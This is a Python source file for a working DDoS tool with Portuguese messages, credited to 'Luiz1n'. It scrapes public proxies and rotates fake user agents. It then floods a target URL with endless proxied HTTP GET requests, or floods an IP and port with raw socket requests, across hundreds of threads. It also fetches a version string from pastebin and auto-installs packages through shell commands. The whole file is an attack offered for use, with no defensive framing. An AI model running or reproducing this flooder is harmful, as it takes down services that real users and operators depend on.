import socket
import re
import threading
import os
import json
import sys
import platform
import random

_path_proxies = 'just/proxies.txt'
_version = open('just/versao').read()
trf = open("config.json", "r")
json_open = json.load(trf)

L4IsActive = json_open["layer4"] == "true"
L7IsActive = json_open["layer7"] == "true"

def Banner():
	print('''

 _______   _______    ______    ______  
/       \ /       \  /      \  /      \ 
$$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ \__$$/ 
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$      \ 
$$ |  $$ |$$ |  $$ |$$ |  $$ | $$$$$$  |
$$ |__$$ |$$ |__$$ |$$ \__$$ |/  \__$$ |
$$    $$/ $$    $$/ $$    $$/ $$    $$/ 
$$$$$$$/  $$$$$$$/   $$$$$$/   $$$$$$/  
                                        
   coded by Luiz1n | https://github.com/luiz1n

		\n''')
Banner()

def checkThisShit(action):
	isWindows = platform.system() == "Windows"
	
	if action == "clear":
		if isWindows:
			os.system("cls")
		else:
			os.system("clear")
	elif action == "checkonly":
		if isWindows:
			return True
		else:
			return False

def SaveProxies(content):
	with open(_path_proxies, 'wb') as file:
		file.write(content)
		file.close()

def WarnUpdate(versao_att):
	link = f"https://github.com/luiz1n/DDoS/releases/tag/{versao_att}"
	print(f"Existe uma nova versão do programa, baixe-a em {link}")

def CheckInstaller(*args):
	for dependencie in args:
		dependencie = dependencie.strip()
		try:
			__import__(dependencie)
		except Exception as e:
			import_name = re.search("'(.+)'", str(e)).group()
			dependencie_not_installed = str(import_name).replace("'", "")
			if checkThisShit("checkonly") == True:
				os.system(f"python -m pip install {dependencie_not_installed}")
			else:
				os.system(f"pip3 install {dependencie_not_installed}")

CheckInstaller("requests", "fake_useragent")

from Logger import *
import requests
from fake_useragent import UserAgent

def CheckUpdates():
	versao_atualizada = requests.get("https://pastebin.com/raw/hbF8RiMS").text
	if _version.strip() != versao_atualizada.strip():
		WarnUpdate(versao_atualizada)
		exit()
	else:
		Sucesso(f"[Sucesso] O programa está devidamente atualizado | Versão Atual: {versao_atualizada}")

CheckUpdates()

def Agent():
	user_agent = UserAgent().random
	return user_agent

def Proxies():
	arq = open(_path_proxies)
	proxy = random.choice(arq.readlines())
	proxy = proxy.strip()
	return proxy

def Generate():
	try:
		_request = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=yes&anonymity=all&simplified=true", timeout=20).content
		SaveProxies(_request.strip())
		Sucesso("[Sucesso] Sucesso ao obter novas proxies. <Carregando DDoS> [...]")

	except:
		Error("[Error] O site proxy-scrape não está respondendo.")

def HowToUse():
	checkThisShit("clear")
	if L7IsActive:
		Error('''
Modo de uso: ddos.py <url> <threads>

Exemplo: ddos.py https://google.com/ 300 

			''')
	else:
		Error('''
Modo de uso: ddos.py <ip> <port> <threads>

Exemplo: ddos.py 192.168.0.1 80 300 

			''')
Generate()

try:

	if L7IsActive:
		_url = sys.argv[1]
		_threads = int(sys.argv[2])
	else:
		_ip = str(sys.argv[1])
		_port = int(sys.argv[2])
		_threads = int(sys.argv[3])

	def Layer7():

		proxies = {'https': f'https://{Proxies()}'}
		headers = {'User-Agent': Agent()}

		while True:
			try:
				Sucesso(f"\n[Sucesso] Atacando: {_url} | Threads: {_threads}")
				requests.get(_url, headers=headers, proxies=proxies)
			except Exception as e:
				pass

	def Layer4():
		get_host = "GET " + "/" + " HTTP/1.1\r\nHost: " + _ip + "\r\n"
		acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", "Accept-Encoding: gzip, deflate\r\n", "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"]
		connection = "Connection: Keep-Alive\r\n"
		useragent = "User-Agent: " + Agent() + "\r\n"
		accept = random.choice(acceptall)
		request = get_host + useragent + accept + connection + "\r\n"
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((str(_ip), int(_port)))
				s.send (str.encode(request))
				Sucesso(f"\n[Sucesso] Atacando: {_ip}:{_port} | Threads: {_threads}")
			except:
				s.close()

	def CreateThreading():
		try:
			for thread in range(_threads):
				Aviso(f"[Sucesso] => Criando <{str(thread)} Threads... | {_threads}")
				if L7IsActive:
					_thread = threading.Thread(target=Layer7)
				else:
					_thread = threading.Thread(target=Layer4)
				_thread.start()
		except KeyboardInterrupt:
			exit()

	def Run():
		try:
			CreateThreading()
		except KeyboardInterrupt:
			exit()


	iniciar = input('\n\n[Enter] -> Deseja iniciar?')
	Run()

except IndexError:
	HowToUse()
	exit()

except ValueError:
	Error(f"O Campo 'Threads' Só aceita números. Recomendado: 500-1000")
